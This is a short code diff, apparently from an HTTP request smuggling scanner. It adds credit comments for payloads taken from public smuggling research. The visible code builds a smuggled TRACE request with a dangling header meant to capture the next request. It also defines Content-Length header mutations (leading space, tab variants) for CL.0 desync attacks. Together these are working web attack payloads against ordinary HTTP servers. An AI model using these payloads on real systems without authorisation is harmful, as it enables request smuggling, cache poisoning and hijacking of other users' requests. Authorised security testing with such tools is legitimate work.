@@ -15,7 +15,8 @@ smuggle_request_body = "TRACE /DJDHEC.txt HTTP/1.1\r\n"
 smuggle_request_body += "XHEADER: " #Next requests header should start here...
 
 
-
+#Most payloads from https://github.com/defparam/smuggler thank you @defparam
+#Also from https://portswigger.net/research/how-to-turn-security-research-into-profit thank you @albinowax
 clzero_headers["nameprefix1"] = " Content-Length: __CL__"
 clzero_headers["tabprefix1"] = "Content-Length:\t__CL__"
 clzero_headers["tabprefix2"] = "Content-Length\t:\t__CL__"
